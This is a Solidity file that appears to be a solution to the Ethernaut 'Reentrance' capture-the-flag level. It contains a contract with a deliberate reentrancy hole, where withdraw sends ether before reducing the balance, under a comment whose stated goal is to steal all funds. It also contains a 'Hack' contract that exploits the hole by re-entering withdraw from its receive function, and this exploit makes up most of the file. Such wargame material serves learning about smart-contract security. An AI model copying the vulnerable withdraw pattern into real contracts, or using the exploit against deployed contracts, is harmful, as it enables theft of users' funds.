
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import '../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol';

/**
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

    Untrusted contracts can execute code where you least expect it.
    Fallback methods
    Throw/revert bubbling
    Sometimes the best way to attack a contract is with another contract.
    See the Help page above, section "Beyond the console"

**/
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      require(result);
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Helper {


    function getBalance(address _add) public view returns(uint) {
        return _add.balance;
    }

    function sendMoney(address _add) public payable {
        (bool success,) = _add.call{value: msg.value}("");
        require(success);
    }

}

interface ReentranceI {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract Hack {

    ReentranceI deposit_contract;

    uint attackAmount; 

    uint i = 0;

    constructor(address _add) {
        deposit_contract = ReentranceI(_add);
    }

    function deposit() public payable {
        deposit_contract.donate{value: msg.value}(address(this));
    }
    
    function attack() public payable {
        attackAmount = msg.value;
        deposit();
        withdraw(attackAmount);
    }
    
    function withdraw(uint amount) public {
        deposit_contract.withdraw(amount);
    }

    function checkBalance() public view returns(uint) {
        return address(this).balance;
    }

    function checkBalanceDep() public view returns(uint) {
        return address(deposit_contract).balance;
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {
      if (i == 0){
          withdraw(100);       
      }
      i = 1;
    }

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}
   
   



}